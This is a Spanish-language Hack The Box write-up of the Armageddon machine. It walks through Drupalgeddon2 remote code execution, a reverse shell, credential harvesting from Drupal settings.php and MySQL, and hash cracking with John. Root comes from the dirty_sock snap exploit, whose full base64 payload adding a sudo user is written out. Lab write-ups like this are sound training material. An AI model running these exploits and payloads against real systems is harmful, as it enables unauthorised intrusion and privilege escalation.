---
title: Armageddon (Hack The Box)
author: J0lm3d0
date: 2021-07-24 21:00:00 +0200
categories: [HackTheBox]
tags: [linux, drupal, drupalgeddon, sudo, snap, dirty_sock]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Armageddon de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/Armageddon/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Armageddon.pdf)

## Enumeración de servicios y recopilación de información sensible

Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```bash
# nmap -p- --open -T5 -n -vv 10.10.10.233

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

Una vez que enumero los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```bash
# nmap -p 22,80 -sC -sV 10.10.10.233

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

Los scripts de `Nmap` me muestran algunas cosas interesantes, como el servidor web utilizado (Apache 2.4.6), la versión de PHP y que se emplea un gestor de contenidos `Drupal` (versión 7). También me indica algunas rutas deshabilitadas en el fichero `robots.txt`. Al tratarse de un gestor de contenidos Drupal, consigo enumerar la versión exacta accediendo al fichero `CHANGELOG.txt`, donde nos aparece el listado de cambios de la última versión instalada y de las versiones anteriores.

```bash
# curl http://10.10.10.233/CHANGELOG.txt

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```

Con esta versión de Drupal y la pista que ofrece el nombre de la máquina (Armageddon), el primer vector de ataque que se me ocurre probar es el exploit `Drupalgeddon2`, que consiste en una Ejecución Remota de Código (RCE) sin necesidad de autenticarnos en el gestor de contenido. Al buscar en `SearchSploit`, encuentro 3 exploits correspondientes a Drupalgeddon2, 2 escritos en Ruby (uno de ellos para Metasploit) y 1 escrito en Python.

![Búsqueda de exploits para la versión de Drupal](/assets/img/HTB/Armageddon/searchsploit.png)

Probare primero con el script en Ruby, cuyo identificador en Exploit-DB es 44449.

## Acceso a la máquina

Tras ejecutar el script y pasarle como argumento la URL del servidor vulnerable, consigo conectarme a la máquina víctima como el usuario `apache`. El script simula una shell, aunque se trata de una fake-shell, ya que lo que hace es subir un archivo PHP malicioso al servidor y tramitar una petición HTTP con cada comando que recibe.

![Ejecución del exploit y conexión a la máquina víctima](/assets/img/HTB/Armageddon/drupalgeddon2.png)

Una vez dentro de la máquina víctima, me envío una shell a mi máquina de atacante utilizando algunas sentencias de Python3, para así trabajar de una forma más cómoda en la escalada de privilegios.

![Envío de una shell mediante Python3 a la máquina atacante](/assets/img/HTB/Armageddon/revshell.png)

## Escalada de privilegios

### Usuario brucetherealadmin

Una vez obtengo la reverse shell, me pongo a buscar dentro del directorio del servidor web archivos de configuración en PHP, ya que estos pueden contener credenciales en texto claro. En mi caso, utilizaré `Grep` para filtrar por ficheros o directorios que contengan las palabras "config" o "settings" en el nombre..

```bash
$ find . | grep -E "config|settings"

./misc/configure.png
./modules/update/update.settings.inc
./sites/default/default.settings.php
./sites/default/settings.php
./themes/garland/theme-settings.php
./web.config
./.editorconfig
```

De los resultados obtenidos, el que más me llama la atención es el fichero "settings.php". Al abrir el archivo y buscar en él, visualizo la siguiente estructura, correspondiente a las credenciales de una base de datos local:

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Con esas credenciales, utilizo la interfaz de línea de comandos de `MySQL` para intentar acceder a la base de datos y ver su contenido. En primer lugar, listo las tablas que componen la base de datos "drupal" y que tengan contenido relativo a los usuarios, filtrando con \textbf{\textsl{Grep}} por las palabras "user" y "pass".

```
$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -e "SHOW TABLES FROM drupal;" | grep -i -E "user|pass"

shortcut_set_users
users
users_roles
```

De las tablas que he obtenido, la que más me interesa es la de "users". Si utilizamos la sentencia `describe` podemos ver los campos que componen la tabla, siendo uno de ellos el campo "pass".
```
$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -D drupal -e "describe users;"

Field   Type    Null    Key     Default Extra
uid     int(10) unsigned        NO      PRI     0
name    varchar(60)     NO      UNI
pass    varchar(128)    NO
mail    varchar(254)    YES     MUL
theme   varchar(255)    NO
signature       varchar(255)    NO
signature_format        varchar(255)    YES             NULL
created int(11) NO      MUL     0
access  int(11) NO      MUL     0
login   int(11) NO              0
status  tinyint(4)      NO              0
timezone        varchar(32)     YES             NULL
language        varchar(12)     NO
picture int(11) NO      MUL     0
init    varchar(254)    YES
data    longblob        YES             NULL
```

Por tanto, utilizo la sentencia `select` para obtener los nombres de usuario y sus respectivas contraseñas, obteniendo el siguiente resultado:

```
$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -D drupal -e "select name,pass from users;"  

name                    pass
brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
toto	$S$DpBGzyo25xGDy9fKxiOQ.Qp/Y716KreJLZ5sW/adVr99WCN2K3AV
random	$S$DBlsy3rYceP/vtBmjPflw0jnwi9vYFCKhuBx0JcrQUm5i2ugImRu
randome	$S$Df0VDlr2RgxhVNFbaRG8FbANcoT.tR18/Z/J0MepSSvMXJ0a7i9X
random0	$S$DAfuci2ClSJhWWxqc96cWSXyjJHh5blq0nwIk1DpfoSSnB705xLW
```

De estos usuarios, los que más me interesan son "brucetherealadmin" y "toto", ya que los otros son usuarios aleatorios creados. Tras una rápida revisión del fichero `/etc/passwd` de la máquina, veo que "brucetherealadmin" es un usuario existente en el sistema Linux, por lo que me centrare primero en este usuario. 

```
$ cat /etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

Copio el hash de la contraseña que hemos obtenido a un fichero y aplico un ataque de fuerza bruta con `John The Ripper` para intentar obtener la contraseña en texto claro.

```
# john --wordlist=/usr/share/wordlists/rockyou.txt brucetherealadmin_hash

Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
```

Con la contraseña obtenida me conecto mediante el servicio SSH y visualizo la flag de usuario en la máquina víctima.

```
# ssh -l brucetherealadmin 10.10.10.233
brucetherealadmin@10.10.10.233's password: 

Last failed login: Thu Apr 15 11:35:07 BST 2021 from 10.10.14.33 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5

[brucetherealadmin@armageddon ~]$ cat user.txt 
9557c1e1d13935db03272b8dc6f9bca3
```

### Usuario administrador (root)

Una vez que he conseguido escalar privilegios al usuario "brucetherealadmin", debo seguir escalando hasta llegar a ser administrador o root. Con el comando `sudo -l` compruebo si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar `snap install` seguido de cualquier argumento como el usuario "root" y sin proporcionar contraseña.

```bash
[brucetherealadmin@armageddon ~]$ sudo -l

Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Investigando por internet formas de escalar privilegios mediante `Snap`, encuentro el exploit `dirty\_sock` en ExploitDB. Tras observar el exploit veo que, mediante un payload codificado en Base64 crea un fichero .snap malicioso que, al instalarlo, creará un usuario "dirty\_sock" que estará dentro del grupo `sudo`, por lo que puedo convertirme en root ejecutando un `sudo su` y proporcionando la contraseña del nuevo usuario creado. 

![Payload del exploit Dirty Sock](/assets/img/HTB/Armageddon/dirtysockpayload.png)

Por tanto, creo un fichero con el contenido del payload decodificado y ejecuto el comando `snap install` con la flag "devmode" y pasandole el archivo .snap malicioso como argumento.

```bash
[brucetherealadmin@armageddon ~]$ python2 -c "print ('''aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''+'A'*4256+'==')" | base64 -d > dirty.snap

[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install --devmode dirty.snap
dirty-sock 0.1 installed
```

Tras esto, el usuario "dirty\_sock" está creado y puedo migrarme a él proporcionando la contraseña, que también es "dirty\_sock". Por último, ejecuto un `sudo su` y vuelvo a proporcionar la contraseña del usuario "dirty\_sock", convirtiéndome así en root y pudiendo visualizar la flag final.

```bash
[brucetherealadmin@armageddon ~]$ su dirty_sock
Password: dirty_sock
[dirty_sock@armageddon ~]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: dirty_sock

[root@armageddon ~]#cat root.txt 
13a2e1f5a9e7946e71b640a533c676e5
```
